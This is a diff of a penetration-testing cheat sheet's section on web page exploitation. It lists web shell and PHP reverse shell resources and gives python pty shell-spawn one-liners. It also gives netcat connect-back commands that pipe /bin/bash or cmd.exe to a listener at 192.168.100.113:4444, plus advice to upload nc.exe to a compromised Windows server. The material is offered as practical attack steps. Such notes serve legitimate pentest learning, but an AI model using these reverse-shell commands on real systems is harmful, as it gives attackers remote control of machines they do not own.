@@ -37,9 +37,12 @@ EXPLOITATION WITH HTML/PHP FILES FROM LOCAL MACHINE
 USEFUL SHELL FOR WEB PAGE EXPLOITATION
 
   Command line Shells
+  
        • https://github.com/flozz/p0wny-shell 
-       
+   
+   
   Reverse Shells
+  
        • http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
        • https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
 
@@ -47,12 +50,18 @@ USEFUL SHELL FOR WEB PAGE EXPLOITATION
 
  ////If initial shell is occured, always try to spawn full shell (e.g, try python shell spawn, [in Windows] try to download nc.exe to server and connect back)
  
+ 
  Python Shell Spwan
+ 
        • python -c 'import pty;pty.spawn("/bin/sh")
-       • python3 -c 'import pty;pty.spawn("/bin/sh")
        
+       • python3 -c 'import pty;pty.spawn("/bin/sh")
+    
+    
  Netcat Connect Back
+ 
        • nc.exe 192.168.100.113 4444 –e cmd.exe   ////on Windows machines
+       
        • nc 192.168.100.113 4444 –e /bin/bash     ////on Linux machines
        
        
